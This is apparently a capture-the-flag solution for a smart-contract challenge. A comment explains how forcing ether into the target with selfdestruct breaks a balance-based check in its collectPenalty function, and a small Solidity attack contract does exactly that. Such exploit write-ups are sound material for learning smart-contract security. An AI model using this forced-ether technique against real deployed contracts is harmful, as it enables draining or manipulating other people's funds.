/*

in this challenge, the collectPenalty function relies on the contract balance instead of tracking it using a variable.

if we deploy a contract and call selfdestruct(ChallengeContractAddress) , the challenge contract balance will be above 1, 

so the uint256 withdrawn = startBalance - address(this).balance; statement will be > 0 which will pass the require statement

*/

pragma solidity 0.8.6;

contract RetiremenFuncAttack {


    constructor() payable {

    }

    function destroy(address payable _victim) external {

        selfdestruct(_victim);
    }
}
